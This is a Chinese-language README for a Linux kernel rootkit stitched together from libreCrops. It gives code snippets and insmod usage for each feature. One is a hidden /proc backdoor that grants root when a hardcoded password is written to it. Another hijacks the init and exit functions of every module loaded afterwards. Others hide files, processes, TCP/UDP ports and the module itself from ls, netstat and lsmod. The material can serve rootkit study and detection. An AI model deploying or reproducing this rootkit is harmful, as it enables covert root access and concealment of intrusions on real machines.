## 开发者：
Eidos

## 参考资料：
libreCrops所提全部功能相关的内容

是一个整合体（缝合怪）。

## 运行环境：
尚没有测试过全部版本，开发时采用的环境为`Ubuntu20.04 + Linux kernel 5.4.81`。但根据5.x中较小的代码变动以及该项目尚未使用`kall_sysm_table`进行函数挂钩，应该适用于大部分5.x版本内核。
## 主体文件：
`hide.c`为全部功能集成的`main`文件，如需添加功能，在`Makefile`后嵌入新模块并采用类似其余模块的方式进行函数调用即可。

特别注意：包含写保护信息的函数模块`./src/protect.o`需要放在队伍的最后。
```Makefile
hide-objs := ./src/hide.o ./src/backdoor.o ./src/fake.o \
./src/filehide.o ./src/prochide.o ./src/protocolhide.o \
./src/modhide.o ./src/protect.o
```
## 功能简介
### 后门设置：
```C
// 提权所需口令
#define PASSWORD "ELPSYKONGROO"
#define BACKDOOR "STEINSGATE" // 后门需要藏好
#define BACKDOOR_PATH "/proc" // 因此需要特地先藏好这个文件路径
```
本Rootkit设置了提权选项，其所在路径为`/proc/STEINSGATE`，在输入"ELPSYKONGROO"给/proc/STEINSGATE文件时，将会提权为Root。

该后门采用了进程隐藏的方式藏匿起来，无法通过`ls /proc`寻找到。

对应模块文件：`backdoor.c`
### 阻止后续插入模块正常运转：
```C
switch (module->state) {
    case MODULE_STATE_COMING:
        printk(KERN_INFO "Replacing init and exit functions: %s.\n", module->name);
        module->init = fake_init;
        module->exit = fake_exit;
        break;
    default:
        break;
}
```
利用`notifier_block`的链式通知机制，以及利用`data`段存放`module`的做法实现了以下功能：当之后有新的模块嵌入时，其无法正常运转其功能，而是执行`fake_init`和`fake_exit`这些由我们的模块设置好的自定义功能。

经过测试可以支持多个模块的阻止功能。

对应模块文件`fake.c`
### 文件隐藏：
```C
char* hide_path = "default";
char* file_name = "default";
module_param(hide_path, charp, 0000);
MODULE_PARM_DESC(hide_path, "the path of dirent for file hide.");
module_param(file_name, charp, 0000);
MODULE_PARM_DESC(file_name, "the file name to hide.");
```
文件隐藏功能，在默认的情况下不打开：我们通过设置`hide_path`和`file_name`为"default"作为默认值，并判断模块插入后这两个参数的赋值情况来确定是否执行文件隐藏。具体来说如下所示：
```C
if (strcmp("default", hide_path) == 0) {
    return;
}
                
printk(KERN_INFO "Opening the path: %s.\n", hide_path);          
filp = filp_open(hide_path, O_RDONLY, 0);                

if (filp == NULL) return;        
```
其原理为当前文件夹下的`iterate`函数挂钩修改，在此不赘述。

如果我们需要隐藏根目录下的文件"alien"，模块的使用方法为：
```shell
$ sudo insmod hide.ko hide_path="/" file_name="alien"
```
再次在根目录下使用`ls`命令，能够观测到`alien`文件的消失。

对应模块文件`filehide.c`

### 进程隐藏：
进程隐藏与文件隐藏原理保持一致，只是锁定了先前提及的hide_path为常量：
```C
#define PROC_HIDE_PATH "/proc"
```
特别的，由于我们之前设置的后门亦在该文件夹下，需特地把后门隐藏好再说。
```C
module_param(secret_proc, long, S_IRUSR);
MODULE_PARM_DESC(secret_proc, "the secret process number.");
```
若想隐藏进程号为1234的进程，使用方法：
```shell
$ sudo insmod hide.ko secret_proc=1234
```

该过程会让其在文件夹`/proc`下不可见。

对应模块文件：`prochide.c`

### 端口隐藏：
```C
int tcp4 = INT_MAX;
int tcp6 = INT_MAX;
int udp4 = INT_MAX;
int udp6 = INT_MAX;

module_param(tcp4, int, S_IRUSR | S_IWUSR | S_IRGRP);
module_param(tcp6, int, S_IRUSR | S_IWUSR | S_IRGRP);
module_param(udp4, int, S_IRUSR | S_IWUSR | S_IRGRP);
module_param(udp6, int, S_IRUSR | S_IWUSR | S_IRGRP);

MODULE_PARM_DESC(tcp4, "tcp4 port.");
MODULE_PARM_DESC(tcp6, "tcp6 port.");
MODULE_PARM_DESC(udp4, "udp4 port.");
MODULE_PARM_DESC(udp6, "udp6 port.");
```
端口文件提供了四个可由命令行传递的参数，以模块隐藏TCP4端口为33，TCP6端口为34，UDP4端口为123，UDP6端口为124为例，使用的方法为：
```shell
$ sudo insmod hide.ko tcp4=33 tcp6=34 udp4=123 udp6=124
```

端口隐藏涉及了`seq_file`类型的文件操作函数`show`，通过挂载该函数可以实现端口的隐藏，通过阅读源码可知，四种类型均存放输出信息于`seq_file`数据结构的`buf`载荷之中，以`count`作为当前`buf`长度，在我们使用`netstat`或者`cat /proc/net/tcp`最后以`write`方式输出在终端上。以TCP4隐藏端口为例。
```C
last_count = seq->count;
snprintf(needle, NEEDLE_LEN, ":%04X", tcp4);
ret = real_seq_show_tcp4(seq, v);
last_size = seq->count - last_count;

if (strnstr(seq->buf + seq->count - last_size, needle, last_size)) {
    printk(KERN_INFO "Hiding port %d using needle %s.\n", tcp4, needle);
    seq->count -= last_size; 
}
```
本质上他修正`count`载荷大小为读入该端口信息前的长度，如果我们隐藏的信息是最后一个，那么因为长度不够而干脆不打印。如果我们隐藏的端口信息不是最后一个，那么之后的端口信息将会覆盖之，从而实现隐藏。

对应的模块文件为`protocolhide.c`

### 模块隐藏：
综合使用了用于`seq_file`的隐藏方式和文件隐藏方式，使得模块`hide`的存在信息不可见于`cat /sys/module`和`lsmod`命令。

对应的模块文件为`modhide.c`

## 源码阅读：
参考`libreCrops`文件夹中的wiki。